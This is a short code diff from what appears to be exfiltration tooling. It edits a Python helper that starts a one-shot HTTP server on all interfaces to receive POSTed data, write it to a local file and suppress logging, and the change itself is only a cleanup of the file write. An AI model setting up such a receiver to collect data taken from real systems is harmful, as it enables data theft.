@@ -97,7 +97,7 @@ def _start_receive_server(port=EXFIL_HTTP_PORT, output_path=EXFIL_LOCAL_PATH):
         f"class H(http.server.BaseHTTPRequestHandler):\n"
         f"    def do_POST(self):\n"
         f"        n=int(self.headers['Content-Length'])\n"
-        f"        open('{output_path}','wb').write(self.rfile.read(n))\n"
+        f"        with open('{output_path}','wb') as fh: fh.write(self.rfile.read(n))\n"
         f"        self.send_response(200);self.end_headers()\n"
         f"    def log_message(self,*a):pass\n"
         f"http.server.HTTPServer(('0.0.0.0',{port}),H).handle_request()\n"
